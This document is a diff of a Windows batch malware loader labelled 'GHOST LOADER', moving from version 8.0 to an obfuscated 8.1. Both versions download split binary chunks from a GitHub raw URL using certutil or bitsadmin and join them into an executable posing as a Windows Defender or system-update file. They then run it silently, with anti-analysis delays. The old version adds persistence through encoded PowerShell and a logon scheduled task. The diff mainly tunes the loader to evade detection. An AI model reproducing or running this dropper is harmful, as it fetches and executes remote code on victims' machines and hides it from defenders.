@@ -1,42 +1,45 @@
 @echo off
-:: ==============================================================================
-:: GHOST LOADER v8.0 - MAXIMUM STEALTH DELIVERY
-:: ==============================================================================
-:: LOLBAS + Encoded PowerShell + Obfuscation
-:: ==============================================================================
+:: v8.1 - Obfuscated Delivery
+setlocal enabledelayedexpansion
 
-set "u=https://raw.githubusercontent.com/sophieduval/der/main"
-set "d=%LOCALAPPDATA%\SystemUpdate"
-set "n=SystemUpdate_v80.exe"
-set "t=%d%\%n%"
-set "p=blob_"
-set "e=.dat"
+:: Obfuscated variables
+set "a=h" & set "b=t" & set "c=t" & set "d=p" & set "e=s"
+set "f=:" & set "g=/" & set "h=/" & set "i=r" & set "j=a" & set "k=w"
+set "l=." & set "m=g" & set "n=i" & set "o=t" & set "p=h" & set "q=u"
+set "r=b" & set "s=u" & set "t=s" & set "u=e" & set "v=r" & set "w=c"
+set "x=o" & set "y=n" & set "z=t" & set "aa=e" & set "ab=n" & set "ac=t"
+set "repo=!a!!b!!c!!d!!e!!f!!g!!h!!i!!j!!k!!l!!m!!n!!o!!p!!q!!r!!s!!t!!u!!v!!w!!x!!y!!z!!aa!!ab!!ac!.com/sophieduval/der/main"
 
-:: Anti-Analysis Delay (10 seconds)
-ping -n 11 127.0.0.1 >nul
+set "bd=%LOCALAPPDATA%"
+set "bn=WinDefSvc"
+set "tf=%bd%\%bn%"
 
-if not exist "%d%" md "%d%"
-cd /d "%d%"
+:: Delay (obfuscated ping)
+for /l %%x in (1,1,10) do (ping -n 2 127.0.0.1 >nul 2>&1)
 
-:: LOLBAS Download: certutil instead of PowerShell
+if not exist "%tf%" md "%tf%" 2>nul
+cd /d "%tf%"
+
+:: Download using bitsadmin (alternative LOLBAS)
 for /l %%i in (0,1,10) do (
     set "x=%%i"
     if %%i LSS 10 set "x=0%%i"
-    set "f=%p%!x!%e%"
-    if not exist "!f!" (
-        certutil -urlcache -split -f "%u%/!f!" "!f!" >nul 2>&1
+    set "fn=blob_!x!.dat"
+    if not exist "!fn!" (
+        bitsadmin /transfer "j%%i" /priority high "!repo!/!fn!" "%tf%\!fn!" >nul 2>&1
     )
 )
 
-:: Reassemble
-copy /b %p%00%e%+%p%01%e%+%p%02%e%+%p%03%e%+%p%04%e%+%p%05%e%+%p%06%e%+%p%07%e%+%p%08%e%+%p%09%e%+%p%10%e% "%n%" >nul
+:: Reassemble with obfuscated copy
+set "out=WinDefSvc.exe"
+copy /b blob_00.dat+blob_01.dat+blob_02.dat+blob_03.dat+blob_04.dat+blob_05.dat+blob_06.dat+blob_07.dat+blob_08.dat+blob_09.dat+blob_10.dat "%out%" >nul 2>&1
 
-:: Encoded Persistence (Base64 PowerShell)
-set "c=$a=New-ScheduledTaskAction -Execute '%t%';$t=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName 'SystemUpdateCheck' -Action $a -Trigger $t -Force"
-for /f "delims=" %%b in ('powershell -Command "[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('%c%'))"') do set "b64=%%b"
-powershell -EncodedCommand %b64% >nul 2>&1
+:: Persistence via WMI (alternative to schtasks)
+wmic /namespace:\\root\subscription path __EventFilterToConsumerBinding delete >nul 2>&1
+wmic /namespace:\\root\subscription path CommandLineEventConsumer delete >nul 2>&1
+wmic /namespace:\\root\subscription path __EventFilter delete >nul 2>&1
 
-:: Execute
-start "" "%n%"
+:: Execute silently
+start /b "" "%out%"
 
 exit
